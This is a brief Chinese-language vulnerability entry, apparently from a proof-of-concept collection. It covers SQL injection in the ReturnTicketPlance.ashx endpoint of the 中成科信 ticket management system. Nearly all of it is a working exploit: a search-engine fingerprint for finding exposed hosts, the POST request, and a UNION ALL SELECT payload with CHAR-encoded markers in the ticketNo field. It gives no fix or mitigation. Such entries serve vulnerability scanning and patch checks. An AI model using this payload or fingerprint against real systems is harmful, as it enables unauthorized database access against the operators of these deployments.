# 中成科信票务管理系统ReturnTicketPlance.ashxSQL注入漏洞

- **系统**：中成科信票务管理系统ReturnTicketPlance.ashx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="1632964065"`
- **请求**：`POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=utf-8`

**请求体 / payload**
```
Method=GetCheckInDetail&ticketNo={{urlescape(' UNION ALL SELECT NULL,CHAR(113)+CHAR(106)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(74)+CHAR(79)+CHAR(112)+CHAR(87)+CHAR(122)+CHAR(103)+CHAR(66)+CHAR(87)+CHAR(118)+CHAR(107)+CHAR(77)+CHAR(103)+CHAR(121)+CHAR(119)+CHAR(87)+CHAR(69)+CHAR(102)+CHAR(68)+CHAR(112)+CHAR(105)+CHAR(97)+CHAR(75)+CHAR(105)+CHAR(77)+CHAR(106)+CHAR(66)+CHAR(73)+CHAR(102)+CHAR(122)+CHAR(78)+CHAR(80)+CHAR(81)+CHAR(83)+CHAR(66)+CHAR(71)+CHAR(102)+CHAR(73)+CHAR(74)+CHAR(80)+CHAR(65)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113),NULL,NULL-- BEsy)}}
```
- **预期**：200　|　—